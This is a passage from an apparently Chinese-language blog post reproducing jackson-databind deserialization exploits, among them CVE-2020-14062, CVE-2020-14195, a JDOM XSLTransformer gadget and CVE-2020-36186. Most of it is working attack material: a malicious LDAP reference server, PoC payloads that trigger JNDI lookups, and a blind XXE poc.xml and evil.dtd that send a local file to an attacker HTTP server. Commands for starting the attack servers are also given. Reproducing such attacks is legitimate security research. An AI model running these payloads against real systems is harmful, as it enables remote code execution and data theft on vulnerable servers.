class="keyword">new</span> InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(<span class="string">"Listening on 0.0.0.0:"</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title">InMemoryOperationInterceptor</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">OperationInterceptor</span> <span class="params">( URL cb )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> </span>&#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = <span class="keyword">new</span> Entry(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException </span>&#123;</span><br><span class="line">            URL turl = <span class="keyword">new</span> URL(<span class="keyword">this</span>.codebase, <span class="keyword">this</span>.codebase.getRef().replace(<span class="string">'.'</span>, <span class="string">'/'</span>).concat(<span class="string">".class"</span>));</span><br><span class="line">            System.out.println(<span class="string">"Send LDAP reference result for "</span> + base + <span class="string">" redirecting to "</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">"javaClassName"</span>, <span class="string">"Exploit"</span>);</span><br><span class="line">            String cbstring = <span class="keyword">this</span>.codebase.toString();</span><br><span class="line">            <span class="keyword">int</span> refPos = cbstring.indexOf(<span class="string">'#'</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">"javaCodeBase"</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">"objectClass"</span>, <span class="string">"javaNamingReference"</span>);</span><br><span class="line">            e.addAttribute(<span class="string">"javaFactory"</span>, <span class="keyword">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> LDAPResult(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line"></span><br><span class="line">        String payload = <span class="string">"[\"oadd.org.apache.xalan.lib.sql.JNDIConnectionPool\",&#123;\"jndiPath\":\"ldap://127.0.0.1:1389/badClassName\"&#125;]"</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object obj = mapper.readValue(payload, Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            mapper.writeValueAsString(obj);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后运行该程序，成功执行命令，弹出计算器：</p><h1 id="CVE-2020-14062"><a href="#CVE-2020-14062" class="headerlink" title="CVE-2020-14062"></a>CVE-2020-14062</h1><p>影响范围</p><ul><li>jackson-databind before 2.9.10.4</li><li>jackson-databind before 2.8.11.6</li><li>jackson-databind before 2.7.9.7</li></ul><p>利用条件</p><ul><li>开启enableDefaultTyping()</li><li>使用了com.sun.xml.parsers:jaxp-ri第三方依赖</li></ul><p>漏洞复现</p><p>pom.xml </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;2.9.10.4&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;com.sun.xml.parsers&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;jaxp-ri&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;1.4&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.slf4j&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;slf4j-nop&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;1.7.2&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;!-- https:<span class="comment">//mvnrepository.com/artifact/javax.transaction/jta --&gt;</span></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;javax.transaction&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;jta&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;1.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;com.unboundid&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;3.1.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>Poc.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        String payload = <span class="string">"[\"com.sun.org.apache.xalan.internal.lib.sql.JNDIConnectionPool\",&#123;\"jndiPath\":\"ldap://127.0.0.1:1389/badClassName\"&#125;]"</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object obj = mapper.readValue(payload, Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            mapper.writeValueAsString(obj);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="CVE-2020-14195"><a href="#CVE-2020-14195" class="headerlink" title="CVE-2020-14195"></a>CVE-2020-14195</h1><p>影响范围</p><ul><li>jackson-databind before 2.9.10.4</li><li>jackson-databind before 2.8.11.6</li><li>jackson-databind before 2.7.9.7</li></ul><p>利用条件</p><ul><li>开启enableDefaultTyping()</li><li>使用了org.jsecurity.realm.jndi.JndiRealmFactory第三方依赖</li></ul><p>pom.xml</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;2.9.10.4&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- https:<span class="comment">//mvnrepository.com/artifact/org.jsecurity/jsecurity --&gt;</span></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.jsecurity&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;jsecurity&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;0.9.0&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.slf4j&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;slf4j-nop&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;1.7.2&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;!-- https:<span class="comment">//mvnrepository.com/artifact/javax.transaction/jta --&gt;</span></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;javax.transaction&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;jta&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;1.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;com.unboundid&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;3.1.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>漏洞Poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        String payload = <span class="string">"[\"org.jsecurity.realm.jndi.JndiRealmFactory\",&#123;\"jndiNames\":\"ldap://127.0.0.1:1389/badClassName\"&#125;]"</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object obj = mapper.readValue(payload, Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            mapper.writeValueAsString(obj);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Jackson-JDOM-XSLTransformer-Gadget"><a href="#Jackson-JDOM-XSLTransformer-Gadget" class="headerlink" title="Jackson JDOM XSLTransformer Gadget"></a>Jackson JDOM XSLTransformer Gadget</h1><p>影响范围</p><ul><li>Jackson 2.x ~2.9.9</li></ul><p>利用条件</p><ul><li>开启enableDefaultTyping</li><li>使用了JDOM 1.x 或 JDOM 2.x 依赖</li></ul><p>漏洞简介<br>在Jackson 2.x ~ Jackson 2.9.9,当开发人员在应用程序中通过ObjectMapper对象调用enableDefaultTyping方法并且服务端使用了JDOM 1.x 或 JDOM 2.x 依赖库时，攻击者可以发送恶意的JSON消息，读取远程服务器上的任意文件。</p><p>创建一个Meaven项目，在pom.xml文件中添加以下依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-annotations --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-core --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.jdom/jdom2 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.jdom<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jdom2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>编写poc.xml<br>该XXE属于Blind XXE，我们构造以下恶意xml代码，它会去调用位于我们的攻击主机上(这里以本地启动的Http服务模拟)的外部dtd文件(不在同一个文件写入要读取的文件主要是为了避免参数实体引用时发生的错误）：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">any</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///g:/json.txt"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://127.0.0.1:4444/evil.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%send; </span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p>编写evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">ppp</span> <span class="meta-string">"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://127.0.0.1/%file;'&gt;"</span>&gt;</span></span><br><span class="line">%ppp;</span><br></pre></td></tr></table></figure><p>起一个web服务，端口为4444，将以上两个xml文件放入其中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 4444</span><br></pre></td></tr></table></figure><p>再起一个web服务，端口为80，接受盲打返回的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span>  </span>&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        String payload = <span class="string">"[\"org.jdom2.transform.XSLTransformer\", \"http://127.0.0.1:4444/poc.xml\"]"</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            mapper.readValue(payload, Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞原理可看此文章：<a href="https://xz.aliyun.com/t/7820" target="_blank" rel="noopener">Jackson JDOM XSLTransformer Gadget浅析</a>    </p><h1 id="jackson-databind-RCE-CVE-2020-36186"><a href="#jackson-databind-RCE-CVE-2020-36186" class="headerlink" title="jackson-databind RCE(CVE-2020-36186)"></a>jackson-databind RCE(CVE-2020-36186)</h1><p>影响范围    </p><ul><li>Jackson-databind &lt; 2.9.10.7</li></ul><p>利用条件</p><ul><li>开启enableDefaultTyping()</li><li>使用了commons-dbcp第三方依赖库</li></ul><p>漏洞概述<br>org.apache.tomcat.dbcp.dbcp.datasources.PerUserPoolDataSource类绕过了之前jackson-databind维护的黑名单类，并且JDK版本较低的话，可造成RCE。</p><p>漏洞复现<br>pom.xml如下：     </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.10.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/tomcat/naming-factory-dbcp --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>naming-factory-dbcp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.5.23<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-nop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/javax.transaction/jta --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.transaction<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jta<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>开启ldap服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;127.0.0.1:4444&#x2F;#Exploit 1389</span><br></pre></td></tr></table></figure><p>Poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.SerializationFeature;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, <span class="keyword">false</span>);</span><br><span class="line">        String json = <span 